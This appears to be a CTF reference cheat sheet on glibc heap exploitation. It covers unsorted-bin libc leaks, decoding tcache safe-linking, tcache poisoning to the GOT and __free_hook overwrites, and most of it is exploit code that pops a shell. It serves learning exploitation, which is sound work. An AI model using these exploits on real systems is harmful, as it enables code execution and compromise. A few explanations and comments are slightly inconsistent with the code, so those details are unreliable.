# UAF / Tcache

## Unsorted Bin Libc Leak

**When:** You have a `show` (read) primitive on a freed chunk.

**How it works:** Free a chunk larger than 0x410 bytes. It goes to the unsorted bin, which writes libc `main_arena` pointers at offset 0 and 8 of the chunk's data area. Reading the freed chunk leaks a libc address.

```
Chunk layout after free (unsorted bin):
+------------------+
| prev_size        |  (8 bytes)
+------------------+
| size | flags     |  (8 bytes)
+------------------+
| fd               |  -> points to &main_arena.bins[0]  (libc addr)
+------------------+
| bk               |  -> points to &main_arena.bins[0]  (libc addr)
+------------------+
| ... unused ...   |
+------------------+

Reading the chunk data gives us a libc address from fd/bk.
```

```python
add(0, 0x500, b'A')   # chunk > 0x410 goes to unsorted bin on free
add(1, 0x20, b'B')    # guard chunk (prevents top-chunk consolidation)
delete(0)
show(0)
leak = u64(io.recvn(6).ljust(8, b'\x00'))
libc.address = leak - 0x203b20  # offset depends on libc version
```

Find the right offset for your libc:

```
The leak is at &main_arena.bins[0], which is main_arena + 0x60 in glibc 2.39
main_arena offset from libc base is typically 0x203b20 (Ubuntu 24.04)

To find it yourself:
  gdb: p &main_arena
  Then: &main_arena - libc_base
```

## Tcache Safe-Linking (glibc 2.32+)

**When:** glibc 2.32 or later. Tcache freelist pointers are obfuscated. Reading a freed tcache chunk gives an encoded pointer, not a raw address.

**How it works:** The fd pointer of a tcache chunk is XORed with `(chunk_addr >> 12)`. To decode: the lowest nibble is the same as the encoded value (no XOR on bits above address width), then iteratively XOR nibbles upward.

```
Tcache free list (safe-linked):
+------------------+
| fd (encoded)     |  = actual_next ^ (chunk_addr >> 12)
+------------------+
| key              |  = tcache pointer (double-free detection)
+------------------+

To decode: nibble by nibble from LSB to MSB
To encode: ptr ^ (position >> 12)
```

```python
def obfuscate(ptr, pos):
    return ptr ^ (pos >> 12)

def reveal(x, bits=64):
    p = 0
    for i in range(bits * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << (i + 12))) >> (i + 12)
        p |= (v1 ^ v2) << i
    return p

enc = reveal(u64(raw_fd))        # raw_fd from show(0) on freed tcache chunk
heap_base = enc - chunk_offset   # subtract where this chunk is in heap
```

## Tcache Poison (with safe-linking)

**How it works:** Overwrite the encoded fd of a freed tcache chunk to point to our target. The next two allocations return: first the freed chunk (normal), then our target address (arbitrary write).

```
Step 1: Edit freed chunk's fd to target
  [+] ChunkA (freed, in tcache)  fd -> target (encoded)
  [+] tcache head now points to ChunkA

Step 2: First malloc (returns ChunkA)
  [+] tcache head now points to target

Step 3: Second malloc (returns target address)
  [+] We can write at target
```

```python
# Overwrite fd of freed chunk
target = e.got['free']
edit(victim, p64(obfuscate(target, heap_base + victim_offset)))

add(0, 0x100, p64(libc.sym['system']))  # first alloc: normal
add(1, 0x100, p64(libc.sym['system']))  # second alloc: writes to target
```

## Tcache Poison to GOT

**When:** Partial RELRO (GOT is writable). Point tcache to a GOT entry, overwrite with `system`, then trigger that GOT entry with "/bin/sh" as argument.

```python
edit(victim, p64(obfuscate(e.got['free'], heap_base + victim_off)))
add(0, 0x100, p64(libc.sym['system']))  # writes system() to free@GOT
add(1, 0x100, b'/bin/sh\x00')           # second alloc
delete(1)  # calls system("/bin/sh") instead of free
```

## Hooks (glibc < 2.34)

**When:** Older glibc where `__free_hook`, `__malloc_hook` still exist.

```python
target = libc.symbols['__free_hook']
edit(victim, p64(target))                   # tcache -> __free_hook
add(0, 0x80, p64(libc.sym['system']))       # write system to __free_hook
add(1, 0x80, b'/bin/sh\x00')
delete(1)  # calls system("/bin/sh")
```

For glibc 2.34+, use FSOP instead.
